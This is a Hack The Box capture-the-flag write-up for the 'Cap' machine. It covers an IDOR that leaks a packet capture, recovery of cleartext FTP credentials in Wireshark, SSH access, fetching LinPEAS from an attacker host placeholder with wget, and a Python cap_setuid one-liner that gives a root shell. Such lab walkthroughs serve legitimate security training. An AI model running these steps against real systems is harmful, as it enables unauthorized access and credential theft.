# HTB — Cap Writeup

**Platform:** Hack The Box  
**Difficulty:** Easy  
**Tags:** `nmap` `idor` `wireshark` `ftp` `ssh` `linpeas` `python` `capabilities` `setuid`

---

## Overview

Cap is an Easy-rated Linux machine on Hack The Box. The attack chain involves finding an IDOR vulnerability on a network monitoring web dashboard to download a PCAP file containing FTP credentials in cleartext, using those credentials to SSH in as the user `nathan`, and then exploiting a misconfigured Linux capability on the Python binary to escalate to root.

---

## Enumeration

### Step 1 — Verify connectivity

Before scanning, confirm the target is reachable:

```bash
ping 10.129.1.250
```

### Step 2 — Nmap port scan

Run a fast scan to identify open ports:

```bash
nmap -F 10.129.1.250
```

> **Note:** For more thorough real-world enumeration, consider `-p-` to scan all ports, `-T4` to speed things up, and `-sS` for a SYN scan. The `-F` flag is used here for speed.

**Results:** Three open ports are found:

| Port | Service |
|------|---------|
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

---

## Web Exploitation — IDOR on Network Dashboard

### Step 3 — Browse to the web application

Navigate to the target in your browser:

```
http://10.129.1.250
```

You are greeted with a network monitoring dashboard belonging to the user **Nathan**.

### Step 4 — Exploit an IDOR to access captured packets

Click the **Security Snapshot** tab. The current snapshot shows all packet counts as `0`, meaning no traffic was captured in the current session.

Notice the URL ends with `/data/1`. Change the `1` to `0`:

```
http://10.129.1.250/data/0
```

This is an **Insecure Direct Object Reference (IDOR)** — the application fails to verify that the requested resource belongs to the current user. The `/data/0` snapshot contains real captured network traffic.

Download the PCAP file from this page.

---

## Credential Discovery — Wireshark

### Step 5 — Analyze the PCAP file

Open the downloaded PCAP in Wireshark:

```bash
wireshark <filename>.pcap
```

Filter on the **FTP** protocol, as FTP transmits data in cleartext. Within the FTP stream you will quickly spot a login sequence that exposes both a **username** and a **password** in plaintext.

Take note of both — the username is **`nathan`** and the password will be needed in the next step.

---

## Initial Access — SSH

### Step 6 — SSH as nathan

Use the credentials recovered from the PCAP file:

```bash
ssh nathan@10.129.1.250
```

Enter the password found in the Wireshark capture when prompted.

**We're in.**

### Step 7 — User flag

List the contents of the home directory:

```bash
ls
```

A `user.txt` file is present. Read it for the user flag:

```bash
cat user.txt
```

---

## Privilege Escalation — Python Capabilities

### Step 8 — Transfer and run LinPEAS

[LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) is a script that searches for common privilege escalation vectors on Linux systems.

On your **Kali machine**, download and set up LinPEAS:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
```

Host the file over HTTP so the target can fetch it:

```bash
python3 -m http.server 8000
```

On the **target machine** (as `nathan`), pull the script down:

```bash
wget http://<YOUR_KALI_IP>:8000/linpeas.sh
chmod +x linpeas.sh
```

### Step 9 — Run LinPEAS and review results

```bash
./linpeas.sh
```

Review the output and focus on findings highlighted in **red/orange**, which LinPEAS marks as high-confidence privilege escalation paths. One finding stands out: the **Python binary has the `cap_setuid` capability set**.

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Linux capabilities allow specific elevated privileges to be granted to binaries without making them full SUID root. `cap_setuid` allows the process to call `setuid()` — which is enough to become root.

### Step 10 — Exploit cap_setuid to get root

Spawn a Python shell and use `setuid(0)` to switch to the root user:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

You now have a root shell. Retrieve the root flag:

```bash
cat /root/root.txt
```

---

## Flags

| Flag | Location |
|------|----------|
| User | `~/user.txt` (as `nathan`) |
| Root | `/root/root.txt` (after privilege escalation via Python `cap_setuid`) |

---

## Key Takeaways

- **IDOR vulnerabilities** are easy to miss but trivial to exploit — always test numeric IDs in URLs by incrementing or decrementing them.
- **FTP is plaintext** — any credentials transmitted over FTP can be captured and read by anyone with access to network traffic. Always use SFTP or SCP instead.
- **Linux capabilities** are a common and often overlooked privilege escalation vector. `cap_setuid` on an interpreter like Python is effectively equivalent to SUID root.

---

## References

- [LinPEAS — GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [Linux Capabilities — man7.org](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [IDOR — OWASP](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet)
- [Hack The Box — Cap](https://app.hackthebox.com/machines/Cap)
